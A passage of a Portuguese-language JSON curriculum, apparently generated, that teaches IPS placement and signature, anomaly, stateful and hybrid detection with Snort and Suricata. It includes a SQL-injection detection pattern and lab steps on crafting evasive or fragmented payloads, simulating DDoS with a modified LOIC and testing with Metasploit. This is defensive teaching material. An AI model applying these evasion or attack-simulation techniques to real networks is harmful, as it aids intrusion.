                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Mapear a topologia da rede atual",
                                  "subSteps": [
                                    "Colete diagramas existentes da rede, incluindo firewalls, switches, roteadores e servidores.",
                                    "Identifique todos os segmentos de rede, como DMZ, rede interna e VLANs.",
                                    "Registre fluxos de tráfego principais usando ferramentas de monitoramento.",
                                    "Anote zonas de alta criticidade, como servidores de banco de dados e aplicações web.",
                                    "Crie um diagrama atualizado da topologia."
                                  ],
                                  "verification": "Diagrama da topologia redesenhado e validado com stakeholders.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Ferramentas de diagramação (draw.io ou Visio), documentação de rede existente, acesso a ferramentas de monitoramento (Wireshark ou SNMP).",
                                  "tips": "Comece pelo perímetro externo e avance para o núcleo interno para evitar omissões.",
                                  "learningObjective": "Compreender a estrutura física e lógica da rede para identificar pontos de implantação.",
                                  "commonMistakes": "Ignorar VLANs ou segmentos isolados, levando a cobertura incompleta."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar padrões de tráfego e riscos",
                                  "subSteps": [
                                    "Monitore o tráfego em pontos chave para quantificar volume e tipos de dados.",
                                    "Classifique tráfego crítico (ex: HTTP/HTTPS para web, SQL para bancos).",
                                    "Identifique vetores de ataque comuns em cada segmento (ex: DDoS no perímetro).",
                                    "Avalie gargalos de desempenho e latência atual.",
                                    "Priorize segmentos com alto risco e tráfego sensível."
                                  ],
                                  "verification": "Relatório de análise de tráfego com métricas e riscos priorizados.",
                                  "estimatedTime": "6 horas",
                                  "materials": "Ferramentas de análise de tráfego (Wireshark, NetFlow Analyzer), logs de firewall.",
                                  "tips": "Use baselines de tráfego de pelo menos 24h para capturar padrões diários.",
                                  "learningObjective": "Identificar onde o IPS terá maior impacto na detecção e prevenção de ameaças.",
                                  "commonMistakes": "Focar apenas em volume de tráfego, ignorando qualidade e criticidade dos dados."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Avaliar opções de posicionamento estratégico",
                                  "subSteps": [
                                    "Liste posições candidatas: inline entre firewall e servidores, TAP/SPAN em switches.",
                                    "Simule impacto de cada posição em cobertura e desempenho.",
                                    "Considere redundância e failover para alta disponibilidade.",
                                    "Avalie requisitos de hardware (throughput do IPS vs. tráfego peak).",
                                    "Compare prós e contras de cada opção em uma matriz de decisão."
                                  ],
                                  "verification": "Matriz de decisão preenchida com posições recomendadas.",
                                  "estimatedTime": "5 horas",
                                  "materials": "Software de simulação de rede (GNS3 ou Packet Tracer), planilhas para matriz.",
                                  "tips": "Priorize posicionamento inline para prevenção ativa, mas use TAP para monitoramento passivo inicial.",
                                  "learningObjective": "Selecionar posições que maximizem cobertura sem comprometer performance.",
                                  "commonMistakes": "Posicionar IPS em pontos de baixa tráfego, reduzindo eficácia."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Documentar e validar o plano de posicionamento",
                                  "subSteps": [
                                    "Crie diagrama final com IPS posicionado e fluxos de tráfego anotados.",
                                    "Defina políticas de IPS específicas para cada segmento.",
                                    "Planeje testes de implantação (PoC) e rollout.",
                                    "Obtenha aprovação de stakeholders com apresentação do plano.",
                                    "Atualize documentação de rede com o novo posicionamento."
                                  ],
                                  "verification": "Plano documentado aprovado e diagrama atualizado no repositório.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Templates de documentação, ferramentas de apresentação (PowerPoint), acesso a repositório de docs.",
                                  "tips": "Inclua custos estimados e ROI para facilitar aprovação.",
                                  "learningObjective": "Formalizar um plano acionável e sustentável.",
                                  "commonMistakes": "Não considerar escalabilidade futura, como crescimento de tráfego."
                                }
                              ],
                              "practicalExample": "Em uma rede corporativa com firewall na borda, DMZ para web servers e segmento interno para bancos de dados, posicione o IPS inline entre o firewall e a DMZ para inspecionar tráfego web, e em modo TAP no switch interno para monitorar acessos a bancos sem interromper operações.",
                              "finalVerifications": [
                                "Diagrama de rede atualizado inclui IPS em posições estratégicas.",
                                "Cobertura de 100% dos segmentos críticos confirmada.",
                                "Análise de tráfego valida ausência de gargalos pós-posicionamento.",
                                "Matriz de decisão justifica escolhas com métricas quantitativas.",
                                "Plano aprovado por equipe de rede e segurança.",
                                "Teste PoC simulado sem impactos negativos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de pontos de tráfego alto e riscos (90%+ cobertura).",
                                "Equilíbrio entre cobertura, performance e custo no plano.",
                                "Qualidade da documentação e diagramas (clareza e completude).",
                                "Incorporação de redundância e escalabilidade.",
                                "Validação prática via simulação ou PoC.",
                                "Conexão clara com objetivos de segurança da rede."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Topologia e fluxos de tráfego (CCNA/CCNP).",
                                "Gestão de Projetos: Matriz de decisão e planejamento (PMBOK).",
                                "Análise de Riscos: Identificação de vetores de ataque (CISSP).",
                                "Administração de Sistemas: Monitoramento e logs (Linux/Windows SysAdmin)."
                              ],
                              "realWorldApplication": "Em data centers empresariais, bancos ou provedores de cloud, posicionar IPS corretamente previne breaches como ransomware, garantindo conformidade com normas como PCI-DSS ou GDPR ao inspecionar tráfego sensível em tempo real."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.4.2",
                        "name": "Técnicas de Detecção em IPS",
                        "description": "Métodos utilizados pelo IPS para identificar intrusões em tempo real no tráfego de rede.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.2.1",
                            "name": "Descrever detecção baseada em assinaturas",
                            "description": "Entender como o IPS compara pacotes de rede com assinaturas conhecidas de ataques, incluindo atualização de bancos de assinaturas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Detecção Baseada em Assinaturas",
                                  "subSteps": [
                                    "Defina o que é uma assinatura em IPS: padrões pré-definidos de ataques conhecidos.",
                                    "Diferencie detecção baseada em assinaturas de detecção baseada em anomalias.",
                                    "Identifique componentes chave: banco de assinaturas, motor de inspeção e regras de matching.",
                                    "Estude exemplos simples de assinaturas, como padrões de strings maliciosas.",
                                    "Revise como assinaturas são representadas (ex: expressões regulares ou hashes)."
                                  ],
                                  "verification": "Resuma em suas palavras os conceitos fundamentais e forneça 2 exemplos de assinaturas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação de IPS (Snort rules), vídeo introdutório sobre detecção de intrusões.",
                                  "tips": "Use analogias como 'assinaturas virais' para facilitar a compreensão.",
                                  "learningObjective": "Explicar o papel das assinaturas na detecção de ameaças conhecidas.",
                                  "commonMistakes": "Confundir assinaturas com heurísticas ou detecção comportamental."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Processo de Comparação de Pacotes de Rede",
                                  "subSteps": [
                                    "Descreva o fluxo: captura de pacotes, normalização e inspeção payload.",
                                    "Explique técnicas de matching: comparação byte-a-byte, regex ou hashes MD5.",
                                    "Estude deep packet inspection (DPI) vs superficial.",
                                    "Simule o processo: divida um pacote em header e payload.",
                                    "Identifique thresholds para alertas falsos positivos."
                                  ],
                                  "verification": "Desenhe um diagrama do fluxo de comparação e teste com um pacote exemplo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ferramenta Wireshark para captura de pacotes, regras de exemplo do Snort.",
                                  "tips": "Pratique com tráfego real capturado para visualizar payloads.",
                                  "learningObjective": "Mapear o pipeline de inspeção de pacotes em IPS.",
                                  "commonMistakes": "Ignorar normalização de pacotes, levando a matching incorreto."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Exemplos de Assinaturas e Cenários de Matching",
                                  "subSteps": [
                                    "Analise assinaturas reais: ex. SQL injection ('1=1--') ou buffer overflow.",
                                    "Teste matching: crie payloads que acionem ou evitem detecção.",
                                    "Discuta evasão: fragmentação, ofuscação de payload.",
                                    "Compare assinaturas stateful vs stateless.",
                                    "Pratique identificando falsos positivos em tráfego legítimo."
                                  ],
                                  "verification": "Crie e teste 3 assinaturas personalizadas em um simulador IPS.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Simulador online de IPS (ex: Snort em VM), conjunto de regras públicas.",
                                  "tips": "Use ambientes isolados para testes de payloads maliciosos.",
                                  "learningObjective": "Aplicar assinaturas a cenários reais de ataques.",
                                  "commonMistakes": "Subestimar evasões como codificação URL."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerenciar Atualizações de Bancos de Assinaturas",
                                  "subSteps": [
                                    "Explique fontes de assinaturas: vendors (Cisco, Snort community).",
                                    "Descreva processo de atualização: pull automatizado, verificação de integridade.",
                                    "Discuta frequência: diária/semanal, balanceamento downtime vs segurança.",
                                    "Aborde versionamento e rollback de assinaturas.",
                                    "Monitore impactos: aumento de falsos positivos pós-atualização."
                                  ],
                                  "verification": "Simule uma atualização e verifique logs de mudanças.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Guia de atualização Snort/Suricata, script de automação exemplo.",
                                  "tips": "Automatize com cron jobs para prática realista.",
                                  "learningObjective": "Implementar manutenção proativa de bancos de assinaturas.",
                                  "commonMistakes": "Atualizar sem backup, causando interrupções."
                                }
                              ],
                              "practicalExample": "Em um IPS Snort, uma assinatura para detectar SQL injection ('SELECT.*FROM.*WHERE.*1=1') compara o payload de um pacote HTTP POST. Se matching, bloqueia e loga o ataque, prevenindo injeção em um servidor web vulnerável.",
                              "finalVerifications": [
                                "Explicar o fluxo completo de detecção baseada em assinaturas.",
                                "Identificar e descrever 3 tipos de assinaturas comuns.",
                                "Simular matching de um pacote com Wireshark e regra personalizada.",
                                "Descrever processo de atualização e riscos associados.",
                                "Diferenciar detecção de assinatura de outras técnicas em IPS.",
                                "Listar 2 evasões comuns e contramedidas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do matching de pacotes (90%+ corretude).",
                                "Profundidade nos substeps com exemplos concretos.",
                                "Compreensão de atualizações e gerenciamento (incluindo automação).",
                                "Identificação correta de erros comuns e evasões.",
                                "Integração de verificações práticas em todos steps.",
                                "Clareza em diagramas ou simulações fornecidas."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de protocolos com Wireshark (CCNA).",
                                "Programação: Uso de regex em Python para matching de assinaturas.",
                                "Banco de Dados: Reconhecimento de padrões SQL injection.",
                                "Gestão de Sistemas: Automação de atualizações via scripts shell."
                              ],
                              "realWorldApplication": "Em centros SOC de empresas como bancos, IPS com detecção de assinaturas bloqueia ataques conhecidos em tempo real, como exploits EternalBlue, atualizando assinaturas diariamente para novas CVEs publicadas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.2.2",
                            "name": "Explicar detecção baseada em anomalias",
                            "description": "Analisar o uso de baselines de tráfego normal para detectar desvios comportamentais, como picos de tráfego ou padrões suspeitos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Fundamentais de Detecção Baseada em Anomalias",
                                  "subSteps": [
                                    "Defina detecção baseada em anomalias como a identificação de padrões de tráfego que desviam do comportamento normal esperado.",
                                    "Compare com detecção baseada em assinaturas, destacando que anomalias focam em desvios comportamentais em vez de padrões conhecidos de ataques.",
                                    "Estude componentes chave: baseline (padrão normal), threshold (limite de desvio) e alertas gerados por desvios.",
                                    "Revise exemplos iniciais de anomalias, como tráfego excessivo de um host específico.",
                                    "Anote diferenças entre ruído benigno e anomalias maliciosas."
                                  ],
                                  "verification": "Resuma em 3-5 frases os conceitos principais e forneça 2 exemplos de anomalias vs. normalidade.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Artigos sobre IDS/IPS (ex: NIST SP 800-94), vídeo introdutório no YouTube sobre detecção de anomalias.",
                                  "tips": "Use diagramas para visualizar baseline vs. anomalia; desenhe um gráfico simples de tráfego normal e desviado.",
                                  "learningObjective": "Explicar o que é detecção baseada em anomalias e suas diferenças com outros métodos.",
                                  "commonMistakes": "Confundir anomalias com assinaturas; ignorar que baselines dinâmicas evoluem com o tempo."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estabelecer e Analisar Baselines de Tráfego Normal",
                                  "subSteps": [
                                    "Colete dados históricos de tráfego de rede usando ferramentas como Wireshark ou tcpdump.",
                                    "Calcule métricas de baseline: média de pacotes/segundo, volume de bytes, protocolos comuns por horário.",
                                    "Defina janelas temporais (ex: horário comercial vs. noturno) para baselines contextuais.",
                                    "Use estatísticas básicas: média, desvio padrão e percentis (ex: 95% de tráfego dentro de X pacotes).",
                                    "Documente a baseline em uma tabela ou gráfico para referência visual."
                                  ],
                                  "verification": "Crie uma tabela com baseline de tráfego para um cenário simulado e justifique os thresholds.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Wireshark ou tcpdump instalado, dataset de tráfego normal (ex: CICIDS2017 dataset público).",
                                  "tips": "Comece com dados reais da sua rede local para maior relevância; automatize cálculos com Python (pandas).",
                                  "learningObjective": "Construir uma baseline precisa de tráfego normal para um ambiente de rede específico.",
                                  "commonMistakes": "Usar dados insuficientes para baseline (pelo menos 7 dias); ignorar variações sazonais como fins de semana."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e Classificar Desvios Comportamentais",
                                  "subSteps": [
                                    "Monitore tráfego em tempo real e compare com baseline usando thresholds (ex: >2 desvios padrão).",
                                    "Identifique tipos de desvios: picos de tráfego (DDoS), padrões suspeitos (scan de portas lento), latência incomum.",
                                    "Classifique desvios: benigno (backup agendado), suspeito (aumento em portas incomuns), malicioso (tráfego para IPs conhecidos ruins).",
                                    "Aplique filtros: Z-score ou MAD (Median Absolute Deviation) para quantificar desvios.",
                                    "Gere relatórios iniciais de alertas com evidências (capturas de pacotes)."
                                  ],
                                  "verification": "Analise um log de tráfego simulado e liste 3 desvios com justificativa baseada na baseline.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Ferramenta de monitoramento (Snort com regras de anomalia, Zeek), logs de tráfego anômalo simulados.",
                                  "tips": "Simule anomalias injetando tráfego falso com hping3; foque em contexto temporal para precisão.",
                                  "learningObjective": "Detectar e classificar desvios usando métricas quantitativas da baseline.",
                                  "commonMistakes": "Definir thresholds muito rígidos (causam falsos positivos); não considerar assimetria no tráfego (upload/download)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar e Validar Detecção em Cenário Prático",
                                  "subSteps": [
                                    "Configure um IPS simulado (ex: Snort em modo anomaly detection) com sua baseline.",
                                    "Execute teste: injete tráfego anômalo e observe alertas gerados.",
                                    "Valide alertas: investigue falsos positivos/negativos e ajuste thresholds.",
                                    "Documente o processo completo em um relatório com gráficos de tráfego antes/depois.",
                                    "Discuta limitações: dependência de baselines precisas e necessidade de ML para baselines adaptativas."
                                  ],
                                  "verification": "Demonstre detecção de uma anomalia em simulação e ajuste baseado em resultados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "VM com Snort ou Suricata, scripts de simulação de ataques (ex: DDoS com LOIC modificado).",
                                  "tips": "Use ambientes isolados como VirtualBox para testes seguros; registre todos os alertas com timestamps.",
                                  "learningObjective": "Implementar detecção baseada em anomalias e validar sua eficácia.",
                                  "commonMistakes": "Testar apenas anomalias óbvias; esquecer de calibrar para reduzir falsos positivos."
                                }
                              ],
                              "practicalExample": "Em uma rede corporativa, a baseline mostra 500 pacotes/segundo durante o dia útil. Um pico para 5.000 pacotes/segundo à meia-noite, de um servidor interno para IPs externos desconhecidos, dispara alerta de possível exfiltração de dados ou DDoS outbound.",
                              "finalVerifications": [
                                "Explicar corretamente baseline e thresholds com exemplo numérico.",
                                "Identificar pelo menos 3 tipos de desvios comportamentais em um log fornecido.",
                                "Configurar uma ferramenta básica de detecção e gerar alerta simulado.",
                                "Diferenciar falsos positivos de verdadeiros negativos em análise.",
                                "Documentar processo completo com gráficos e justificativas.",
                                "Discutir limitações e melhorias (ex: integração com ML)."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: 90% de acerto em definições e diferenças (rubrica 1-4).",
                                "Qualidade da baseline: Métricas estatísticas corretas e contextualizadas (1-4).",
                                "Detecção eficaz: Identificação correta de 80% das anomalias simuladas (1-4).",
                                "Análise de desvios: Classificação lógica com evidências (1-4).",
                                "Relatório completo: Inclui verificações, gráficos e lições aprendidas (1-4).",
                                "Criatividade em exemplos: Aplicação realista ao contexto IPS (1-4)."
                              ],
                              "crossCurricularConnections": [
                                "Estatística: Cálculo de médias, desvios padrão e testes de outlier.",
                                "Machine Learning: Modelos não-supervisionados como autoencoders para anomalias avançadas.",
                                "Redes de Computadores: Protocolos TCP/IP e análise de pacotes.",
                                "Análise de Dados: Visualização com ferramentas como Grafana ou ELK Stack.",
                                "Ética em TI: Privacidade em monitoramento de tráfego."
                              ],
                              "realWorldApplication": "Em centros de SOC (Security Operations Centers) de empresas como bancos ou e-commerces, detecção de anomalias em IPS previne breaches detectando exfiltração de dados ou bots em redes, como no caso do ataque SolarWinds onde desvios comportamentais foram chave para resposta rápida."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.2.3",
                            "name": "Aplicar detecção baseada em estado",
                            "description": "Compreender a reconstrução de sessões TCP/UDP para detecção de ataques fragmentados ou multi-pacote.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Fundamentos de Estado em Protocolos TCP e UDP",
                                  "subSteps": [
                                    "Estude o handshake de três vias do TCP e os flags de estado (SYN, ACK, FIN, RST).",
                                    "Analise o modelo stateless vs. stateful em firewalls e IPS.",
                                    "Identifique diferenças entre TCP (conexão-orientado) e UDP (sem conexão).",
                                    "Revise conceitos de fragmentação IP e reassembly.",
                                    "Explore exemplos de ataques que exploram falta de estado, como SYN flood."
                                  ],
                                  "verification": "Resuma em um diagrama os estados de uma sessão TCP e liste 3 ataques stateless.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação RFC 793 (TCP)",
                                    "Wireshark para captura de pacotes",
                                    "Livro 'TCP/IP Illustrated' (capítulos iniciais)"
                                  ],
                                  "tips": "Use Wireshark para capturar tráfego real da sua rede local para visualizar estados.",
                                  "learningObjective": "Compreender como o estado de uma sessão é mantido e por que é essencial para detecção.",
                                  "commonMistakes": "Confundir UDP com TCP; ignorar que UDP não tem handshake inerente."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Aprender Reconstrução de Sessões TCP",
                                  "subSteps": [
                                    "Capture pacotes de uma sessão TCP usando Wireshark ou tcpdump.",
                                    "Agrupe pacotes por tupla 5-tuple (src IP, dst IP, src port, dst port, protocolo).",
                                    "Reconstrua a sequência de pacotes ordenando por números de sequência (SEQ/ACK).",
                                    "Simule perda de pacotes e pratique reordenação manual.",
                                    "Use ferramentas como Wireshark's 'Follow TCP Stream' para validar."
                                  ],
                                  "verification": "Reconstrua uma stream TCP de um pcap fornecido e extraia payload legível.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Wireshark ou tcpdump",
                                    "Arquivos pcap de sessões TCP (ex: de sites como packetlife.net)",
                                    "Script Python básico com Scapy para parsing"
                                  ],
                                  "tips": "Sempre filtre por tupla para isolar sessões; pratique com tráfego HTTP para payloads legíveis.",
                                  "learningObjective": "Dominar a reconstrução de fluxos TCP para análise sequencial.",
                                  "commonMistakes": "Ignorar ACKs duplicados ou wraps em números de sequência altos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Manejar Fragmentação IP e Sessões UDP",
                                  "subSteps": [
                                    "Estude fragmentação IP: ID, offset e MF flag nos headers.",
                                    "Capture e reassele fragmentos IP usando Wireshark.",
                                    "Para UDP, agrupe por tupla e detecte 'pseudo-sessões' baseadas em timeouts.",
                                    "Simule ataques fragmentados: envie pacotes fragmentados com Scapy.",
                                    "Pratique detecção de evasão onde payload malicioso está espalhado em fragmentos."
                                  ],
                                  "verification": "Reassele um pcap fragmentado e identifique payload completo em UDP/TCP.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Scapy para geração de pacotes fragmentados",
                                    "Pcaps de fragmentação (ex: de snort.org)",
                                    "Wireshark com filtro 'ip.frag'"
                                  ],
                                  "tips": "Use Scapy para criar pcaps personalizados; defina timeouts curtos para UDP (ex: 30s).",
                                  "learningObjective": "Aplicar reassembly para detectar ataques multi-fragmento em TCP/UDP.",
                                  "commonMistakes": "Reordenar fragmentos incorretamente devido a offsets errados; tratar UDP como stateful."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Detecção de Ataques Baseada em Estado em IPS",
                                  "subSteps": [
                                    "Configure Snort ou Suricata com regras stateful (ex: usando 'flowbits').",
                                    "Teste detecção de ataques fragmentados/multi-pacote (ex: evasão de IDS).",
                                    "Crie regra personalizada para reconstruir sessões e alertar em anomalias.",
                                    "Analise logs de alertas para validar reconstrução correta.",
                                    "Simule cenários reais como Teardrop ou ping-of-death fragmentados."
                                  ],
                                  "verification": "Gere alerta em IPS para um ataque simulado e explique o estado detectado.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Snort/Suricata instalado em VM",
                                    "Scapy para ataques simulados",
                                    "Regras de exemplo de Emerging Threats"
                                  ],
                                  "tips": "Use modo inline para IPS real; teste em ambiente isolado para evitar riscos.",
                                  "learningObjective": "Integrar reconstrução de estado em detecção de ameaças IPS.",
                                  "commonMistakes": "Regras sem inspeção stateful permitindo evasões; sobrecarga de estado em alto tráfego."
                                }
                              ],
                              "practicalExample": "Usando Scapy, gere uma sessão TCP fragmentada onde o payload malicioso (ex: shellcode) está no último fragmento de um pacote UDP-like. Capture com Wireshark, reassele e configure Snort para detectar como 'ataque fragmentado evasivo'.",
                              "finalVerifications": [
                                "Reconstruir manualmente uma sessão TCP de 100+ pacotes de um pcap.",
                                "Reassele fragmentos IP e identifique anomalias como overlaps.",
                                "Configurar regra IPS que alerte apenas após reconstrução completa de estado UDP.",
                                "Simular e detectar SYN flood com tracking de estados semi-abertos.",
                                "Explicar em relatório como estado previne falsos positivos em fragmentação.",
                                "Validar com Wireshark que stream reconstruída matches payload original."
                              ],
                              "assessmentCriteria": [
                                "Precisão na reconstrução de sessões (100% match de payloads).",
                                "Identificação correta de pelo menos 3 tipos de ataques stateful.",
                                "Eficiência na configuração de IPS (sem falsos positivos em tráfego benigno).",
                                "Profundidade da análise de estados (diagrama completo de transições).",
                                "Criatividade em simulações personalizadas com Scapy.",
                                "Clareza no relatório de verificações e lições aprendidas."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Scripts Python/Scapy para automação de parsing de pacotes.",
                                "Análise de Dados: Uso de pandas para logs de sessões e detecção de anomalias.",
                                "Redes: Integração com fundamentos de roteamento e switching.",
                                "Matemática: Algoritmos de ordenação e hashing para tracking de estados."
                              ],
                              "realWorldApplication": "Em centros SOC, detecção stateful em ferramentas como Suricata previne evasões em ataques APT, como fragmentação para bypass de WAFs em tráfego web malicioso ou multi-pacote em C2 channels."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.4.1.1"
                            ]
                          },
                          {
                            "id": "10.1.3.4.2.4",
                            "name": "Configurar regras de detecção híbridas",
                            "description": "Combinar técnicas de assinatura, anomalia e estado para otimizar a precisão e reduzir falsos positivos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos das Técnicas de Detecção",
                                  "subSteps": [
                                    "Estude definições: assinatura (padrões conhecidos de ataques), anomalia (desvios de baseline normal) e estado (rastreamento de sessões TCP/UDP).",
                                    "Analise vantagens e desvantagens: assinaturas são precisas mas estáticas; anomalias detectam zero-days mas geram falsos positivos; estado adiciona contexto.",
                                    "Revise exemplos reais: assinatura para SQL injection, anomalia para tráfego incomum, estado para evasões fragmentadas.",
                                    "Crie um diagrama comparativo das três técnicas.",
                                    "Simule cenários simples em um ambiente virtual para observar cada técnica isolada."
                                  ],
                                  "verification": "Crie um resumo de 1 página comparando as técnicas e diagrama validado por auto-revisão ou peer review.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação Snort/Suricata",
                                    "Vídeos tutoriais sobre IPS (YouTube/Khan Academy)",
                                    "Ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Use analogias: assinatura como impressões digitais, anomalia como detetor de mentiras, estado como memória de conversa.",
                                  "learningObjective": "Diferenciar e exemplificar as três técnicas de detecção em IPS.",
                                  "commonMistakes": [
                                    "Confundir anomalia com heurística",
                                    "Ignorar limitações de estado em protocolos sem conexão como UDP"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Planejar a Arquitetura Híbrida de Regras",
                                  "subSteps": [
                                    "Defina baselines de tráfego normal usando ferramentas como Wireshark para coletar dados de rede.",
                                    "Mapeie ameaças: liste 5-10 ataques comuns e atribua técnicas (ex: assinatura para exploits conhecidos, anomalia para C2).",
                                    "Crie lógica híbrida: priorize assinatura > estado > anomalia, com thresholds para falsos positivos.",
                                    "Desenhe fluxograma de decisão para regras híbridas.",
                                    "Calcule pesos: ex. 70% assinatura, 20% estado, 10% anomalia, ajustando para otimização."
                                  ],
                                  "verification": "Produza um fluxograma e plano de regras documentado, com mapeamento de 10 ameaças.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Wireshark",
                                    "Templates de fluxograma",
                                    "Lista de CVEs recentes (cve.mitre.org)"
                                  ],
                                  "tips": "Comece com tráfego de produção anonimizado para baselines realistas.",
                                  "learningObjective": "Projetar uma combinação lógica de técnicas para maximizar precisão.",
                                  "commonMistakes": [
                                    "Sobrecarregar anomalia sem baseline sólida",
                                    "Ignorar correlações entre estado e assinatura"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Regras Híbridas no IPS",
                                  "subSteps": [
                                    "Instale e configure IPS (Snort ou Suricata) em ambiente virtual (VirtualBox/VMware).",
                                    "Escreva regras híbridas: combine 'alert tcp ... content:\"signature\"' com 'threshold' para anomalia e 'flow' para estado.",
                                    "Integre módulos: habilite anomaly detection e state tracking nas configurações.",
                                    "Carregue regras e inicie captura de tráfego simulado.",
                                    "Ajuste parâmetros iniciais baseados no plano (ex: sensitivity levels)."
                                  ],
                                  "verification": "Execute 'snort -T' ou equivalente para testar sintaxe das regras sem erros.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Snort/Suricata instalados",
                                    "VM com rede simulada",
                                    "Scripts de teste de ataques (Metasploit Atomic Red Team)"
                                  ],
                                  "tips": "Use regras prontas como base e modifique; teste em modo IDS antes de IPS.",
                                  "learningObjective": "Configurar regras híbridas funcionais em um IPS real.",
                                  "commonMistakes": [
                                    "Erros de sintaxe em regras complexas",
                                    "Não habilitar logging para depuração"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Otimizar e Validar",
                                  "subSteps": [
                                    "Gere tráfego de teste: ataques reais (ex: nmap scans, exploits) e benigno.",
                                    "Monitore logs: analise falsos positivos/negativos usando ferramentas como ELK Stack.",
                                    "Ajuste thresholds: reduza falsos positivos refinando anomalia e estado.",
                                    "Meça métricas: precisão, recall, F1-score com scripts simples.",
                                    "Documente iterações e configurações finais."
                                  ],
                                  "verification": "Relatório com métricas mostrando >90% precisão e <5% falsos positivos em 50 testes.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Ferramentas de teste: nmap, Metasploit",
                                    "ELK Stack ou Splunk Free",
                                    "Scripts Python para métricas"
                                  ],
                                  "tips": "Automatize testes com Ansible para repetibilidade.",
                                  "learningObjective": "Otimizar regras híbridas para performance real-world.",
                                  "commonMistakes": [
                                    "Testes insuficientes em tráfego benigno variado",
                                    "Não iterar após primeiros falsos positivos"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Monitorar e Manter Regras Híbridas",
                                  "subSteps": [
                                    "Configure alertas e dashboards para monitoramento contínuo.",
                                    "Estabeleça rotina de tuning semanal baseada em logs.",
                                    "Integre atualizações de assinaturas automáticas (ex: PulledPork).",
                                    "Simule cenários de evasão e teste resiliência.",
                                    "Crie playbook de resposta para alertas híbridos."
                                  ],
                                  "verification": "Dashboard funcional com alertas de teste disparados corretamente.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Kibana/Grafana",
                                    "PulledPork para updates",
                                    "Playbook templates"
                                  ],
                                  "tips": "Use machine learning básico para baselines dinâmicas se avançado.",
                                  "learningObjective": "Garantir sustentabilidade das regras híbridas em produção.",
                                  "commonMistakes": [
                                    "Esquecer updates de assinaturas",
                                    "Ignorar drift de baseline ao longo do tempo"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma rede corporativa com servidores web, configure regras híbridas no Suricata: assinatura para detectar SQLi em payloads HTTP, anomalia para picos de tráfego de um IP, e estado para sessões fragmentadas de DDoS. Teste com simulação de ataque, reduzindo falsos positivos de 15% para 2%.",
                              "finalVerifications": [
                                "Regras híbridas compilam sem erros e detectam 10/10 ataques simulados.",
                                "Falsos positivos <5% em tráfego benigno de 1 hora.",
                                "Métricas de precisão/recall >85% calculadas.",
                                "Fluxograma e documentação completa do design.",
                                "Dashboard de monitoramento exibe alertas em tempo real.",
                                "Playbook de resposta testado com sucesso."
                              ],
                              "assessmentCriteria": [
                                "Compreensão demonstrada via diagrama comparativo preciso (20%)",
                                "Plano híbrido lógico com mapeamento de ameaças (20%)",
                                "Implementação funcional sem erros de sintaxe (25%)",
                                "Otimização comprovada por métricas (20%)",
                                "Documentação clara e sustentável (15%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de pacotes com Wireshark",
                                "Estatística: Cálculo de thresholds e baselines",
